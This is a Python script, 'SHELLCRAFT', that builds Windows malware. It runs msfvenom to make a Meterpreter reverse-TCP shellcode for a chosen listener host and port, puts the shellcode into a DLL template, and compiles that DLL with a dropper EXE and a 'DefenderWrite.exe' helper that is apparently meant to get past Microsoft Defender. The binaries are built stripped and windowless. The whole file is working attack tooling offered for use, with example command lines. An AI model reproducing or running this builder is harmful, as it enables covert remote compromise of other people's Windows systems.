#!/usr/bin/env python3
import os
import sys
import subprocess
import argparse
import re
import shutil

def print_banner():
    banner = r"""
     _____ _          _ _      _____            __ _
    / ____| |        | | |    / ____|          / _| |
    | (___ | |__   ___| | |   | |     _ __ __ _| |_| |_
     \___ \| '_ \ / _ \ | |   | |    | '__/ _` |  _| __|
     ____) | | | |  __/ | |   | |____| | | (_| | | | |_
    |_____/|_| |_|\___|_|_|    \_____|_|  \__,_|_|  \__\

                  SHELLCRAFT by @sam_x86_
    """
    print(banner)

def check_dependencies():
    required_tools = ["msfvenom", "x86_64-w64-mingw32-g++"]
    missing_tools = []
    
    for tool in required_tools:
        if not shutil.which(tool):
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[-] Missing required tools: {', '.join(missing_tools)}")
        print("[+] Install with: sudo apt install metasploit-framework mingw-w64")
        return False
    return True

def extract_shellcode_from_c_format(c_output):
    hex_matches = re.findall(r'\\x([0-9a-fA-F]{2})', c_output)
    
    if hex_matches:
        print(f"[+] Found {len(hex_matches)} shellcode bytes")
        return [f"0x{byte.upper()}" for byte in hex_matches]
    
    return None

def generate_shellcode(lhost, lport):
    print("[+] Generating shellcode with msfvenom...")
    
    try:
        result = subprocess.run([
            "msfvenom",
            "-p", "windows/x64/meterpreter_reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "c",
            "-b", "\\x00\\x0a\\x0d"
        ], capture_output=True, text=True, check=True)
        
        output = result.stdout
        print(f"[*] msfvenom output length: {len(output)} characters")
        
        shellcode_bytes = extract_shellcode_from_c_format(output)
        
        if not shellcode_bytes:
            print("[-] Failed to extract shellcode bytes from msfvenom output")
            return None
        
        print(f"[+] Successfully extracted {len(shellcode_bytes)} bytes of shellcode")
        
        if len(shellcode_bytes) < 300:
            print(f"[-] Shellcode too small ({len(shellcode_bytes)} bytes), something wrong")
            return None
            
        return shellcode_bytes
        
    except subprocess.CalledProcessError as e:
        print(f"[-] msfvenom failed: {e.stderr}")
        return None

def load_shellcode_file(shellcode_path):
    try:
        with open(shellcode_path, "rb") as f:
            output = f.read()
        
        shellcode_bytes = [f"0x{b:02X}" for b in output]
        
        if not shellcode_bytes:
            print(f"[-] Failed to read shellcode from {shellcode_path}")
            return None
        
        print(f"[+] Successfully loaded {len(shellcode_bytes)} bytes of shellcode")
        
        if len(shellcode_bytes) < 300:
            print(f"[-] Shellcode too small ({len(shellcode_bytes)} bytes), may be invalid")
            
        return shellcode_bytes
        
    except Exception as e:
        print(f"[-] Error reading shellcode file: {e}")
        return None

def format_shellcode_for_cpp(shellcode_bytes):
    """Format shellcode bytes for C++ array - properly formatted"""
    lines = []
    for i in range(0, len(shellcode_bytes), 16):
        chunk = shellcode_bytes[i:i+16]
        line = "    " + ", ".join(chunk)
        if i + 16 < len(shellcode_bytes):
            line += ","
        lines.append(line)
    return "\n".join(lines)

def read_write_payloads(shellcode_bytes, args):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    sources_dir = os.path.join(script_dir, "sources")
    
    # Format shellcode
    formatted_shellcode = format_shellcode_for_cpp(shellcode_bytes)
    print(f"[+] Shellcode formatted into C array ({len(shellcode_bytes)} bytes)")
    
    # Read and write DefenderWrite.cpp
    defenderwrite_path = os.path.join(sources_dir, "DefenderWrite.cpp")
    if not os.path.exists(defenderwrite_path):
        print(f"[-] ERROR: Template not found: {defenderwrite_path}")
        sys.exit(1)
    
    with open(defenderwrite_path, "r", encoding="utf-8") as f:
        defenderwrite = f.read()
    
    with open("DefenderWrite.cpp", "w", encoding="utf-8") as f:
        f.write(defenderwrite)
    
    # Create DLL source
    dll_name = os.path.splitext(args.output)[0] + ".dll"
    
    dll_template_path = os.path.join(sources_dir, "payload_dll.cpp")
    if not os.path.exists(dll_template_path):
        print(f"[-] ERROR: Template not found: {dll_template_path}")
        sys.exit(1)
    
    with open(dll_template_path, "r", encoding="utf-8") as f:
        dll_src = f.read()
    
    # Replace the placeholder with formatted shellcode
    dll_src = dll_src.replace("SHELLCODE_PLACEHOLDER", formatted_shellcode)
    
    with open("payload_dll.cpp", "w", encoding="utf-8") as f:
        f.write(dll_src)
    
    # Create dropper EXE
    exe_name = args.output
    dropper_template_path = os.path.join(sources_dir, "dropper.cpp")
    if not os.path.exists(dropper_template_path):
        print(f"[-] ERROR: Template not found: {dropper_template_path}")
        sys.exit(1)
    
    with open(dropper_template_path, "r", encoding="utf-8") as f:
        exe_src = f.read()
    
    # Replace the DLL name placeholder (be careful with the placeholder format)
    exe_src = exe_src.replace("{dll_name}", dll_name)
    
    with open("dropper.cpp", "w", encoding="utf-8") as f:
        f.write(exe_src)
    
    return exe_name, dll_name

def compile_payloads(exe_name, dll_name):
    print("[+] Compiling DefenderWrite.exe...")
    try:
        subprocess.run([
            "x86_64-w64-mingw32-g++",
            "-O2", "-s", "-mwindows", "-static",
            "-static-libgcc", "-static-libstdc++",
            "-o", "DefenderWrite.exe",
            "DefenderWrite.cpp"
        ], check=True)
        print("[+] DefenderWrite.exe compiled successfully")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to compile DefenderWrite.exe: {e}")
        return False
    
    print(f"[+] Compiling {dll_name}...")
    try:
        # First, let's check if the DLL source compiles correctly
        result = subprocess.run([
            "x86_64-w64-mingw32-g++",
            "-c", "-O2",
            "payload_dll.cpp",
            "-o", "payload_dll.o"
        ], capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"[-] Compilation check failed: {result.stderr}")
            
            # Let's check the generated file
            print("[+] Checking generated payload_dll.cpp...")
            with open("payload_dll.cpp", "r") as f:
                content = f.read()
                # Print first 10 lines and last 10 lines
                lines = content.split('\n')
                print("[+] First 10 lines of payload_dll.cpp:")
                for i in range(min(10, len(lines))):
                    print(f"  {i+1}: {lines[i]}")
                print("\n[+] Last 10 lines of payload_dll.cpp:")
                for i in range(max(0, len(lines)-10), len(lines)):
                    print(f"  {i+1}: {lines[i]}")
            
            return False
        
        # If check passes, compile the DLL
        subprocess.run([
            "x86_64-w64-mingw32-g++",
            "-shared", "-s", "-O2",
            "-static", "-static-libgcc", "-static-libstdc++",
            "-o", dll_name,
            "payload_dll.cpp",
            "-lws2_32", "-lwininet"
        ], check=True)
        print(f"[+] {dll_name} compiled successfully")
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to compile DLL: {e}")
        return False
    
    print(f"[+] Compiling {exe_name}...")
    try:
        subprocess.run([
            "x86_64-w64-mingw32-g++",
            "-O2", "-s", "-mwindows",
            "-static", "-static-libgcc", "-static-libstdc++",
            "-o", exe_name,
            "dropper.cpp",
            "-lshlwapi"
        ], check=True)
        print(f"[+] {exe_name} compiled successfully")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to compile EXE: {e}")
        return False
    
    return True

def cleanup():
    temp_files = ["payload_dll.cpp", "dropper.cpp", "DefenderWrite.cpp", "payload_dll.o"]
    for temp_file in temp_files:
        if os.path.exists(temp_file):
            os.remove(temp_file)
            print(f"[+] Removed {temp_file}")

def main():
    parser = argparse.ArgumentParser(
        description="Build DefenderWrite payload with shellcode",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Method 1 (MSF generated): python3 %(prog)s --msf 192.168.1.100 4444 -o payload.exe
  Method 2 (File based):    python3 %(prog)s -s shellcode.bin -o payload.exe
        """
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    
    group.add_argument("--msf", nargs=2, metavar=("LHOST", "LPORT"),
                      help="Generate shellcode with msfvenom (LHOST LPORT)")
    
    group.add_argument("-s", "--shellcode-file",
                      help="Use existing shellcode file (e.g., shellcode.bin)")
    
    parser.add_argument("-o", "--output", default="payload.exe",
                      help="Output EXE name (default: payload.exe)")
    
    args = parser.parse_args()
    
    print_banner()
    
    if not check_dependencies():
        sys.exit(1)
    
    shellcode_bytes = None
    
    if args.shellcode_file:
        print(f"[+] Loading shellcode from file: {args.shellcode_file}")
        shellcode_bytes = load_shellcode_file(args.shellcode_file)
    elif args.msf:
        lhost, lport = args.msf
        print(f"[+] Generating shellcode for {lhost}:{lport}")
        shellcode_bytes = generate_shellcode(lhost, lport)
    
    if not shellcode_bytes:
        print("[-] Failed to get valid shellcode. Exiting.")
        sys.exit(1)
    
    if not os.path.exists("sources"):
        print("[!] ERROR: sources/ directory not found!")
        print("[!] Please create a 'sources' directory with the following files:")
        print("[!]   - sources/DefenderWrite.cpp")
        print("[!]   - sources/payload_dll.cpp")
        print("[!]   - sources/dropper.cpp")
        sys.exit(1)
    
    required_sources = ["DefenderWrite.cpp", "payload_dll.cpp", "dropper.cpp"]
    for source_file in required_sources:
        source_path = os.path.join("sources", source_file)
        if not os.path.exists(source_path):
            print(f"[!] ERROR: Missing {source_path}")
            sys.exit(1)
    
    exe_name, dll_name = read_write_payloads(shellcode_bytes, args)
    
    # Save a copy of the generated DLL source for debugging
    with open("debug_payload_dll.cpp", "w") as f:
        with open("payload_dll.cpp", "r") as src:
            f.write(src.read())
    print("[+] Saved debug_payload_dll.cpp for inspection")
    
    if not compile_payloads(exe_name, dll_name):
        print("[-] Compilation failed. Check debug_payload_dll.cpp for errors.")
        sys.exit(1)
    
    cleanup()
    
    print("\n[*] Build completed successfully")
    print(f"[*] Executable      : {exe_name}")
    print(f"[*] DLL             : {dll_name}")
    print(f"[*] Auxiliary       : DefenderWrite.exe")
    print(f"[*] Shellcode size  : {len(shellcode_bytes)} bytes")

    print("\n[*] Usage:")
    print(f"    {exe_name} must be executed from the same directory\n")

if __name__ == "__main__":
    main()